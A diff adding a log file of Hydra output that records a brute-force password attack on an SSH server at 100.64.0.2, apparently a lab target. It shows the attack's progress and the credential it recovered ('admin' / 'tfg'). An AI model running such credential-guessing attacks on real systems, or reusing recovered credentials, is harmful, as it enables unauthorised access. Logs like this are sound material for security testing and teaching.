@@ -1,0 +1,10 @@
+Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2023-05-15 17:48:42
+[DATA] max 1 task per 1 server, overall 1 task, 56 login tries (l:7/p:8), ~56 tries per task
+[DATA] attacking ssh://100.64.0.2:22/
+[STATUS] 23.00 tries/min, 23 tries in 00:01h, 33 to do in 00:02h, 1 active
+[22][ssh] host: 100.64.0.2   login: admin   password: tfg
+[STATUS] 24.00 tries/min, 48 tries in 00:02h, 8 to do in 00:01h, 1 active
+1 of 1 target successfully completed, 1 valid password found
+Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2023-05-15 17:51:14
